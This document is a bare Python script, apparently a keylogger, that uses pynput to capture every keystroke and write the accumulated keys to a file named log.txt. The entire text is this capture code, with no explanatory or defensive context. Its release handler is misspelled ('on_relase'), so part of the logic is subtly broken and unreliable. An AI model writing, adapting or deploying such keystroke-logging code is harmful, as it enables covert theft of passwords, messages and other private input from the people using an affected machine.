from pynput.keyboard import Key, Listener
keys = []

def on_press(key):
	keys.append(key)
	write_keys(keys)

def write_keys(keys):
	with open ('log.txt', 'w')	as log:
		for key in keys:
			key = str(key).replace("'", "")
			log.write(key)

def on_relase(key):
	return False

with Listener(
	on_press=on_press,
	on_relase=on_relase) as listener:
	listener.join()		